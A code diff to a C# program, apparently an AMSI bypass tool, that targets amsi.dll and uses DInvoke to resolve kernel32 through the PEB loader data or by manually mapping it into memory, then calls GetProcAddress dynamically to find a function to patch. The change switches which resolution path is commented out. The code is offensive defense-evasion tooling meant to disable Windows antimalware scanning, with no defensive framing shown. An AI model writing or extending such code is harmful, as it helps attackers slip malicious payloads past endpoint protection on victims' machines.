@@ -43,8 +43,6 @@ namespace Patch
                     "amsi.dll"
                 };
 
-                /* If Kernel32 Mapping fails:
-                
                 Console.WriteLine("[>] Parsing _PEB_LDR_DATA structure of kernel32.dll \n");
                 // Parsing _PEB_LDR_DATA structure of kernel32.dll
                 IntPtr pkernel32 = DInvoke.DynamicGeneric.GetPebLdrModuleEntry("kernel32.dll");
@@ -61,7 +59,8 @@ namespace Patch
                 
                 
                 
-                */
+                
+                /*
                 Console.WriteLine("[>] Manually mapping kernel32.dll into current process memory \n");
 
                 DInvoke.PE.PE_MANUAL_MAP moduleDetails = DInvoke.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
@@ -72,7 +71,7 @@ namespace Patch
                 Console.WriteLine("[>] Process Handle : " + string.Format("{0:X}", lib.ToInt64()) + "\n");
 
                 //Remove the above if kernel32 mapping fails
-                
+                */
                 // Function to patch
                 object[] GetProcAddressparams =
                 {
@@ -81,10 +80,10 @@ namespace Patch
                 };
 
                 // Parsing _PEB_LDR_DATA structure of kernel32.dll
-                IntPtr pkernel32 = DInvoke.DynamicGeneric.GetPebLdrModuleEntry("kernel32.dll");
+                pkernel32 = DInvoke.DynamicGeneric.GetPebLdrModuleEntry("kernel32.dll");
                 
                 // Get GetProcAddress Address
-                var pLoadLibrary = DInvoke.DynamicGeneric.GetExportAddress(pkernel32, "GetProcAddress");
+                pLoadLibrary = DInvoke.DynamicGeneric.GetExportAddress(pkernel32, "GetProcAddress");
 
                 // Actually Call GetProcAddress for the function mentioned above
                 var addr = (IntPtr)DInvoke.DynamicGeneric.DynamicFunctionInvoke(pLoadLibrary, typeof(GProcAddr), ref GetProcAddressparams);
